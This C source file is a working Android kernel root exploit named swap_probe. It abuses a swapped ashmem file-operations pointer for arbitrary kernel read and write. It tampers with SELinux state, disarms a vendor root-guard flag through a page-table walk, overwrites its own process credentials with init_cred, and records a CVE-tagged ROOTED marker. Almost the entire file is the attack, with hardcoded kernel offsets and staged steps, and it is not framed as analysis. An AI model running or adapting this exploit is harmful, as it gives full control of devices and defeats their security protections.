/*
 * swap_probe v3 — full root chain inside a LIVE staged-swap window.
 * See docs/ROOT_PLAN_2026-08-28.md. All stages are syscall-level (configfs
 * R/W through the swapped fd). NO UAF walks, NO spray.
 *
 * Usage: swap_probe <fake_fops_hex> <slide_hex>
 * Stages:
 *   A kwrite test (page scratch) + llseek repair (stops death clock)
 *   B park: 1 zero byte -> P0(selinux_state)+1   (perf unlocked)
 *   C modip harvest: PMU type=8 histogram -> hook page (off 0x3ac..0x4c8)
 *     -> g_boot_state module VA = page + 0x3000
 *   D PTE walk (VA_BITS=39, PA_BITS=48) via kread -> P0(g_boot_state)
 *   E disarm rootguard: 1 byte 0x01 -> P0(g_boot_state)
 *   F unpark: 1 byte 0x01 -> P0(selinux_state)+1
 *   G task self-find: runtime tasks-offset + comm match "GLRW01"
 *   H root: kwrite task+0x778/+0x780 = init_cred P0
 *   I cleanup: restore miscdevice.fops -> slid &ashmem_fops
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>

#define __ASHMEMIOC 0x77
#define ASHMEM_NAME_LEN 256
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define KIMAGE 0xffffffc080000000ULL
#define OFF_NOOP_LLSEEK 0x181FE48ULL
#define OFF_CFG_READ 0x182FCF8ULL
#define OFF_ASH_RDITER 0x1822948ULL
#define OFF_ASH_FOPS 0x22BFDC8ULL          /* &ashmem_fops (image) */
#define OFF_MISC_FOPS 0x291A8E8ULL         /* miscdevice.fops slot */
#define OFF_SELINUX_STATE 0x2A793C8ULL     /* bools: enforcing at +1 */
#define OFF_INIT_TASK 0x27CC000ULL
#define OFF_INIT_CRED 0x27E0BE0ULL

#define PGD_P0 0xffffff802a491000ULL       /* swapper_pg_dir physmap alias */
#define P0_BASE 0xffffff8000000000ULL
#define P0_PHYS_OFF 0x80000000ULL
#define PTE_ADDR_MASK 0x0000FFFFFFFFF000ULL

#define TSK_REAL_CRED 0x778
#define TSK_CRED 0x780
#define TSK_COMM 0x790
#define TSK_PID 0x5C8

#define GBOOT_CORE_OFF 0x3000ULL
#define HOOK_LO 0x3acU
#define HOOK_HI 0x4c8U

#define PROBE_COMM "GLRW01"

static uint64_t g_slide;
static uintptr_t g_fake_fops;
static int g_fd;

static uintptr_t slid(uint64_t off) { return (uintptr_t)(KIMAGE + g_slide + off); }
static uintptr_t p0(uint64_t image_off) {
  /* phys = 0xa8000000 + off; alias = P0_BASE + phys - 0x80000000 */
  return (uintptr_t)(P0_BASE + (0xa8000000ULL + image_off - P0_PHYS_OFF));
}
static uintptr_t p0_of_phys(uint64_t phys) {
  return (uintptr_t)(P0_BASE + phys - P0_PHYS_OFF);
}

static void put64(unsigned char *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
static void put32(unsigned char *p, size_t off, uint32_t v) { memcpy(p + off, &v, 4); }

static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) name[i] = blob[i] ? blob[i] : 1;
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < pos; i++) name[i] = blob[i] ? blob[i] : 1;
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}
static int set_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) return -1;
  for (size_t i = len; i > 0; i--)
    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) return -1;
  return 0;
}

static ssize_t kwrite(uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, 88 - 11, target);
  put32(blob, 96 - 11, (uint32_t)len);
  put32(blob, 100 - 11, 0);
  if (set_name_blob(g_fd, blob, sizeof(blob)) != 0) return -1;
  errno = 0;
  return pwrite(g_fd, data, len, 0);
}

static ssize_t kread(uintptr_t target, void *data, size_t len) {
  uint64_t cfg_r = slid(OFF_CFG_READ);
  uint64_t zero = 0;
  if (kwrite(g_fake_fops + 0x10, &cfg_r, 8) != 8) return -10;
  if (kwrite(g_fake_fops + 0x20, &zero, 8) != 8) return -11;

  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = 0x1000;
  if ((size_t)pos < len) pos = (off_t)len + 0x100;
  put64(blob, 88 - 11, (uint64_t)(target - (uintptr_t)pos));
  put32(blob, 96 - 11, (uint32_t)pos + (uint32_t)len);
  put32(blob, 80 - 11, 0);
  put32(blob, 100 - 11, 0);
  ssize_t rd = -1;
  if (set_name_blob(g_fd, blob, sizeof(blob)) == 0) {
    errno = 0;
    rd = pread(g_fd, data, len, pos);
  }
  uint64_t real_rd = slid(OFF_ASH_RDITER);
  kwrite(g_fake_fops + 0x10, &zero, 8);
  kwrite(g_fake_fops + 0x20, &real_rd, 8);
  return rd;
}

static uint64_t kread64(uintptr_t a) {
  uint64_t v = 0;
  if (kread(a, &v, 8) != 8) return 0;
  return v;
}

/* ---- stage C: perf harvest -> g_boot_state module VA ---- */
static uintptr_t harvest_gboot(void) {
  int pmu = 8;
  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
  if (f) {
    if (fscanf(f, "%d", &pmu) != 1) pmu = 8;
    fclose(f);
  }
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.size = sizeof(pe);
  pe.type = (uint32_t)pmu;
  pe.config = 0x8; /* inst_retired */
  pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
  printf("  perf fd=%d errno=%d (need park first if 13)\n", fd, errno);
  if (fd < 0) return 0;
  size_t msz = 4096 * 65;
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 64;
  uint64_t pos = hdr->data_tail;
  uint64_t pages[24];
  int pc[24], hc[24], np = 0;
  memset(pc, 0, sizeof(pc));
  memset(hc, 0, sizeof(hc));
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
      if (ip >= 0xffff000000000000ULL) {
        unsigned off = (unsigned)(ip & 0xfffU);
        int found = -1;
        for (int i = 0; i < np; i++)
          if (pages[i] == (ip & ~0xfffULL)) { found = i; break; }
        if (found < 0 && np < 24) {
          pages[np] = ip & ~0xfffULL;
          pc[np] = 0; hc[np] = 0;
          found = np++;
        }
        if (found >= 0) {
          pc[found]++;
          if (off >= HOOK_LO && off < HOOK_HI) hc[found]++;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  int hot = 0;
  for (int i = 0; i < np; i++) {
    printf("  PAGE %016llx n=%d hook=%d\n",
           (unsigned long long)pages[i], pc[i], hc[i]);
    if (pc[i] > pc[hot]) hot = i;
  }
  int best = -1, bh = 0;
  for (int i = 0; i < np; i++) {
    if (i == hot) continue;
    if (hc[i] > bh) { bh = hc[i]; best = i; }
  }
  munmap(buf, msz);
  close(fd);
  if (best >= 0 && bh >= 2) {
    printf("  hook page %016llx (hits=%d) -> gboot VA %016llx\n",
           (unsigned long long)pages[best], bh,
           (unsigned long long)(pages[best] + GBOOT_CORE_OFF));
    return (uintptr_t)(pages[best] + GBOOT_CORE_OFF);
  }
  return 0;
}

/* ---- stage D: 3-level PTE walk ---- */
static uintptr_t walk_to_p0(uintptr_t va) {
  uint64_t i_pgd = ((uint64_t)va >> 30) & 0x1FF;
  uint64_t i_pmd = ((uint64_t)va >> 21) & 0x1FF;
  uint64_t i_pte = ((uint64_t)va >> 12) & 0x1FF;
  uint64_t e1 = kread64(PGD_P0 + i_pgd * 8);
  printf("  pgd[%llu] = %016llx\n", (unsigned long long)i_pgd,
         (unsigned long long)e1);
  if (!(e1 & 1)) { printf("  pgd invalid\n"); return 0; }
  uint64_t pmd_page = e1 & PTE_ADDR_MASK;
  uint64_t e2 = kread64(p0_of_phys(pmd_page) + i_pmd * 8);
  printf("  pmd[%llu] = %016llx\n", (unsigned long long)i_pmd,
         (unsigned long long)e2);
  if (!(e2 & 1)) { printf("  pmd invalid\n"); return 0; }
  uint64_t phys;
  if (e2 & 2) { /* 2MB block */
    phys = (e2 & ~0x1FFFFFULL) + (((uint64_t)va) & 0x1FFFFF);
    printf("  pmd block -> phys %llx\n", (unsigned long long)phys);
  } else {
    uint64_t e3 = kread64(p0_of_phys(e2 & PTE_ADDR_MASK) + i_pte * 8);
    printf("  pte[%llu] = %016llx\n", (unsigned long long)i_pte,
           (unsigned long long)e3);
    if (!(e3 & 1)) { printf("  pte invalid\n"); return 0; }
    phys = e3 & PTE_ADDR_MASK;
  }
  printf("  page phys %llx -> P0 %016llx\n", (unsigned long long)phys,
         (unsigned long long)p0_of_phys(phys));
  return p0_of_phys(phys);
}

/* ---- stage G: task self-find (runtime tasks offset) ---- */
static int printable_comm(const char *c) {
  int n = 0;
  for (int i = 0; i < 16 && c[i]; i++) {
    if (c[i] < 0x20 || c[i] > 0x7e) return 0;
    n++;
  }
  return n >= 2;
}

static int find_self_task(uintptr_t *out_task, int *out_off) {
  uintptr_t init_task = p0(OFF_INIT_TASK);
  char comm[17] = {0};
  if (kread(init_task + TSK_COMM, comm, 16) != 16 ||
      strncmp(comm, "swapper", 7) != 0) {
    printf("  init_task comm mismatch: %.16s\n", comm);
    return 0;
  }
  printf("  init_task ok (comm=%s)\n", comm);
  /* scan init_task region for the tasks list_head pointer; derive offset by
   * requiring two consecutive comm-readable nodes */
  for (size_t slot = 0x300; slot < 0x700; slot += 8) {
    uintptr_t nxt = (uintptr_t)kread64(init_task + slot);
    if (nxt < 0xffffff8000000000ULL || nxt > 0xffffff9000000000ULL) continue;
    for (int off = 0x300; off <= 0x700; off += 8) {
      uintptr_t t2 = nxt - (uintptr_t)off;
      char c2[17] = {0};
      if (kread(t2 + TSK_COMM, c2, 16) != 16) continue;
      if (!printable_comm(c2)) continue;
      uintptr_t nxt2 = (uintptr_t)kread64(t2 + (uintptr_t)off);
      if (nxt2 < 0xffffff8000000000ULL || nxt2 > 0xffffff9000000000ULL) continue;
      /* walk: find our comm */
      uintptr_t t = t2;
      for (int hops = 0; hops < 4000; hops++) {
        char c[17] = {0};
        if (kread(t + TSK_COMM, c, 16) != 16) break;
        if (strncmp(c, PROBE_COMM, sizeof(PROBE_COMM) - 1) == 0) {
          *out_task = t;
          *out_off = off;
          printf("  tasks_off=%#x self=%016llx (%s)\n", off,
                 (unsigned long long)t, c);
          return 1;
        }
        t = (uintptr_t)kread64(t + (uintptr_t)off) - (uintptr_t)off;
        if (t < 0xffffff8000000000ULL || t > 0xffffff9000000000ULL) break;
        if (t == init_task) break;
      }
    }
  }
  return 0;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    fprintf(stderr, "usage: %s fake_fops_hex slide_hex\n", argv[0]);
    return 2;
  }
  g_fake_fops = (uintptr_t)strtoull(argv[1], NULL, 0);
  g_slide = strtoull(argv[2], NULL, 0);

  g_fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
  if (g_fd < 0) { printf("open failed errno=%d\n", errno); return 1; }
  printf("fd=%d fake_fops=%llx slide=%llx pid=%d\n", g_fd,
         (unsigned long long)g_fake_fops, (unsigned long long)g_slide,
         (int)getpid());
  prctl(PR_SET_NAME, PROBE_COMM, 0, 0, 0);

  /* A: write test + llseek repair */
  const char marker[] = "GLRW01RW";
  if (kwrite(g_fake_fops + 0x700, marker, 8) != 8) {
    printf("A WRITE TEST FAILED errno=%d — swap not live?\n", errno);
    close(g_fd);
    return 1;
  }
  printf("A write LIVE\n");
  uint64_t llseek = slid(OFF_NOOP_LLSEEK);
  printf("A llseek repair ret=%zd\n", kwrite(g_fake_fops + 0x08, &llseek, 8));

  /* B: park */
  unsigned char zero = 0;
  printf("B park ret=%zd\n", kwrite(p0(OFF_SELINUX_STATE) + 1, &zero, 1));

  /* C: harvest */
  uintptr_t gboot_va = harvest_gboot();
  if (!gboot_va) {
    printf("C harvest FAILED — leaving parked, abort\n");
    close(g_fd);
    return 1;
  }

  /* D: walk */
  uintptr_t gboot_p0 = walk_to_p0(gboot_va);
  if (!gboot_p0) {
    printf("D walk FAILED — leaving parked, abort\n");
    close(g_fd);
    return 1;
  }

  /* E: disarm rootguard */
  unsigned char one = 1;
  printf("E gboot disarm ret=%zd\n", kwrite(gboot_p0, &one, 1));

  /* F: unpark */
  printf("F unpark ret=%zd\n", kwrite(p0(OFF_SELINUX_STATE) + 1, &one, 1));

  /* G: find task */
  uintptr_t task;
  int toff;
  if (!find_self_task(&task, &toff)) {
    printf("G task find FAILED (guard already off; cred skipped)\n");
    close(g_fd);
    return 1;
  }

  /* H: cred -> init_cred */
  uint64_t init_cred = (uint64_t)p0(OFF_INIT_CRED);
  printf("H real_cred ret=%zd\n", kwrite(task + TSK_REAL_CRED, &init_cred, 8));
  printf("H cred      ret=%zd\n", kwrite(task + TSK_CRED, &init_cred, 8));

  /* verify */
  if (getuid() == 0) {
    printf("*** ROOT: getuid()=0 euid=%d ***\n", geteuid());
    system("id > /data/local/tmp/ROOTED 2>&1");
    system("echo kernel-root-via-CVE-2026-43499 >> /data/local/tmp/ROOTED");
  } else {
    printf("H cred written but getuid=%d (check guard disarm)\n", getuid());
  }

  /* I: restore fops -> device back to normal */
  uint64_t orig_fops = (uint64_t)slid(OFF_ASH_FOPS);
  printf("I fops restore ret=%zd (orig=%016llx)\n",
         kwrite(p0(OFF_MISC_FOPS), &orig_fops, 8),
         (unsigned long long)orig_fops);
  close(g_fd);
  printf("PROBE DONE uid=%d\n", getuid());
  return getuid() == 0 ? 0 : 1;
}
